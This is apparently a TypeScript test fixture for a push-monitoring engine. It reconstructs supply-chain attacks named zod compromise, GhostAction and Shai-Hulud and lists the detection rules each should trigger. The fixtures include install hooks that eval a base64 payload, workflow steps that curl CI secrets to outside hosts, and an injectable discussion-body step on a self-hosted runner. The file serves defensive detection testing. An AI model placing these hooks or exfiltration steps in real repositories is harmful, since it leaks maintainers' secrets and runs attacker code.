import type { PushContext } from "@/lib/engine"
import type { FixtureLines } from "./lines"

export type AttackFixture = {
  name: string
  context: PushContext
  addedLines: FixtureLines
  expected: string[]
}

const base: PushContext = {
  repo: "acme/lib",
  branch: "main",
  forced: false,
  senderFirstPush: false,
  branchCreated: false,
  branchDeleted: false,
  authorMismatch: false,
  unreviewed: true,
  hourUtc: 2,
  files: [],
  commitMessages: [],
}

// Reconstructions of public incidents, reduced to the files and lines that made them work.
export const ATTACKS: AttackFixture[] = [
  {
    name: "zod compromise (d821685)",
    context: {
      ...base,
      hourUtc: 12,
      files: [
        { path: "package.json", changeType: "modified" },
        { path: "scripts/loader.js", changeType: "added" },
      ],
      commitMessages: ["chore: build tooling"],
    },
    addedLines: {
      "package.json": ['    "preinstall": "node scripts/loader.js",', '    "postinstall": "node scripts/loader.js",'],
      "scripts/loader.js": [
        "const { execSync } = require('child_process')",
        "eval(Buffer.from(process.env.npm_config_payload || '', 'base64').toString())",
      ],
    },
    expected: ["js-install-hook-added", "js-obfuscated-payload"],
  },
  {
    name: "GhostAction",
    context: {
      ...base,
      files: [{ path: ".github/workflows/github_actions_security.yml", changeType: "added" }],
      commitMessages: ["Add Github Actions Security workflow"],
    },
    addedLines: [
      "name: Github Actions Security",
      "on:",
      "  workflow_dispatch:",
      "  push:",
      "jobs:",
      "  send-secrets:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - name: Prepare Cache Busting",
      '        run: curl -s -X POST -d "PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}" https://bold-dhawan.45-139-104-115.plesk.page',
    ],
    expected: ["ci-workflow-changed", "ci-secret-exfiltration", "ci-agent-shaped-push"],
  },
  {
    name: "Shai-Hulud",
    context: {
      ...base,
      files: [
        { path: ".github/workflows/shai-hulud-workflow.yml", changeType: "added" },
        { path: ".github/workflows/discussion.yaml", changeType: "added" },
        { path: ".github/workflows/formatter_123456789.yml", changeType: "added" },
        { path: "package.json", changeType: "modified" },
        { path: "bundle.js", changeType: "added" },
      ],
      commitMessages: ["Shai-Hulud Migration"],
    },
    addedLines: {
      ".github/workflows/shai-hulud-workflow.yml": [
        "on: push",
        "      - run: curl -d \"$CONTENTS\" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7",
        "        env:",
        "          CONTENTS: ${{ toJSON(secrets) }}",
      ],
      ".github/workflows/discussion.yaml": [
        "on: discussion",
        "    runs-on: self-hosted",
        "        run: echo ${{ github.event.discussion.body }}",
      ],
      "package.json": ['    "postinstall": "node bundle.js",'],
      "bundle.js": ["const { exec } = require('child_process')"],
    },
    expected: [
      "ci-workflow-changed",
      "ci-secret-exfiltration",
      "ci-self-hosted-runner",
      "ci-agent-shaped-push",
      "js-install-hook-added",
      "js-obfuscated-payload",
    ],
  },
]
